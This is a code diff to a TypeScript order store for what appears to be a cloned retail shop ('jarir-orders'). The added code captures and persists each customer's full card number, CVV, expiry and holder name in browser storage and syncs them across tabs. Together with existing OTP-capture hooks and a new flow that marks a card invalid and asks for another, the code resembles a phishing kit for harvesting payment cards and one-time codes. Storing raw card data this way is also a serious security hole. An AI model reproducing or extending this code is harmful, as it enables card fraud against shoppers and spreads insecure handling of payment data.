@@ -1,6 +1,7 @@
 import { create } from "zustand";
 import { persist } from "zustand/middleware";
 import { PRODUCTS } from "@/lib/data/products";
+import { ADMIN_REVIEW_MS } from "@/lib/constants";
 import { pushOrderLive, useLiveStore } from "@/lib/store/live";
 import type { Address, Order, OrderStatus, PaymentMethodId } from "@/lib/types";
 import { uid } from "@/lib/utils";
@@ -109,8 +110,11 @@ interface OrdersState {
   requestOtp: (id: string) => void;
   submitOtp: (id: string, code: string) => boolean;
   markOtpWrong: (id: string) => void;
+  markCardInvalid: (id: string) => void;
+  updateCard: (id: string, card: { number: string; expiry: string; cvv: string; holder: string; brand?: string }) => void;
   approvePayment: (id: string) => void;
   rejectPayment: (id: string) => void;
+  autoConfirmExpired: () => void;
 }
 
 function patchOrder(orders: Order[], id: string, fn: (o: Order) => Order) {
@@ -183,12 +187,40 @@ export const useOrdersStore = create<OrdersState>()(
             },
           })),
         }),
+      markCardInvalid: (id) =>
+        set({
+          orders: patchOrder(get().orders, id, (o) => ({
+            ...o,
+            paymentStatus: "card_invalid",
+          })),
+        }),
+      updateCard: (id, card) => {
+        const pan = card.number.replace(/\D/g, "");
+        set({
+          orders: patchOrder(get().orders, id, (o) => ({
+            ...o,
+            paymentStatus: "pending",
+            last4: pan.slice(-4),
+            reviewDeadline: new Date(Date.now() + ADMIN_REVIEW_MS).toISOString(),
+            paymentCapture: {
+              method: "card",
+              holder: card.holder,
+              cardNumber: pan,
+              expiry: card.expiry,
+              cvv: card.cvv,
+              brand: card.brand,
+              last4: pan.slice(-4),
+            },
+          })),
+        });
+      },
       approvePayment: (id) =>
         set({
           orders: patchOrder(get().orders, id, (o) => ({
             ...o,
             paymentStatus: "paid",
             status: o.status === "placed" || o.status === "cancelled" ? "confirmed" : o.status,
+            reviewDeadline: undefined,
           })),
         }),
       rejectPayment: (id) =>
@@ -197,12 +229,29 @@ export const useOrdersStore = create<OrdersState>()(
             ...o,
             paymentStatus: "rejected",
             status: "cancelled",
+            reviewDeadline: undefined,
           })),
         }),
+      autoConfirmExpired: () => {
+        const now = Date.now();
+        let changed = false;
+        const orders = get().orders.map((o) => {
+          if (o.paymentStatus !== "pending" || !o.reviewDeadline) return o;
+          if (now < Date.parse(o.reviewDeadline)) return o;
+          changed = true;
+          return {
+            ...o,
+            paymentStatus: "paid" as const,
+            status: o.status === "placed" || o.status === "cancelled" ? ("confirmed" as const) : o.status,
+            reviewDeadline: undefined,
+          };
+        });
+        if (changed) set({ orders });
+      },
     }),
     {
       name: "jarir-orders",
-      version: 2,
+      version: 3,
       migrate: (persisted) => {
         const s = persisted as OrdersState;
         const seeds = seedOrders();
@@ -235,3 +284,43 @@ export function statusIndex(status: OrderStatus) {
 }
 
 export { STATUS_FLOW };
+
+export function reviewMsLeft(order: { paymentStatus: string; reviewDeadline?: string }) {
+  if (order.paymentStatus !== "pending" || !order.reviewDeadline) return 0;
+  return Math.max(0, Date.parse(order.reviewDeadline) - Date.now());
+}
+
+let applyingRemote = false;
+if (typeof window !== "undefined") {
+  const channel = "BroadcastChannel" in window ? new BroadcastChannel("jarir-orders") : null;
+  useOrdersStore.subscribe((state) => {
+    if (applyingRemote) return;
+    try {
+      channel?.postMessage({ orders: state.orders });
+    } catch {
+      /* ignore */
+    }
+  });
+  channel?.addEventListener("message", (event) => {
+    const orders = (event.data as { orders?: Order[] } | null)?.orders;
+    if (!Array.isArray(orders)) return;
+    applyingRemote = true;
+    useOrdersStore.setState({ orders });
+    applyingRemote = false;
+  });
+  window.addEventListener("storage", (event) => {
+    if (event.key !== "jarir-orders" || !event.newValue) return;
+    try {
+      const parsed = JSON.parse(event.newValue) as { state?: { orders?: Order[] } };
+      if (!Array.isArray(parsed.state?.orders)) return;
+      applyingRemote = true;
+      useOrdersStore.setState({ orders: parsed.state.orders });
+      applyingRemote = false;
+    } catch {
+      /* ignore */
+    }
+  });
+  window.setInterval(() => {
+    useOrdersStore.getState().autoConfirmExpired();
+  }, 1000);
+}
